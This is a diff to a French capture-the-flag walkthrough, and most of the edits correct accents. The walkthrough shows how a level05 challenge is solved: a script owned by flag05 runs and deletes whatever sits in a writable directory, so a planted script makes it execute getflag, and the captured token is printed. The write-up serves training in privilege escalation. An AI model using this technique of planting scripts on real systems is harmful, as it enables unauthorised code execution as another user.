@@ -6,9 +6,9 @@
 *       -> resultat
 */
 
-J avais reperé precedement qu il y avait un dossier level04 dans /var/mail donc je savais qu il fallait utiliser le mail.
+J'avais repéré précédemment qu'il y avait un dossier level04 dans /var/mail donc je savais qu'il fallait utiliser le mail.
 
-- recuperation d'informations
+- récupération d'informations
 find / -user flag05 2>&1 | grep -v 'denied'
     -> 1 fichier: /usr/sbin/openarenaserver
 
@@ -21,11 +21,11 @@ cat /usr/sbin/openarenaserver:
 	    rm -f "$i"
     done
 
-- En etudiant le code on remarque que flag05 execute tous les scripts dans /opt/openarenaserver avant de les supprimer du coup on exploite
+- En étudiant le code on remarque que flag05 exécute tous les scripts dans /opt/openarenaserver avant de les supprimer du coup on exploite
 echo 'getflag > /opt/openarenaserver/flag && sleep 5m' > /opt/openarenaserver/getflag
     -> avec ce script, flag05 appelera getflag et mettra le resultat dans le flag avant de se poser pendant 5 min
 
-- En surveillant le repertoire, on voit apparaitre le fichier flag, on l affiche
+- En surveillant le repertoire, on voit apparaitre le fichier flag, on l'affiche
 cat /opt/openarenaserver/flag
     -> Check flag.Here is your token : viuaaale9huek52boumoomioc
     
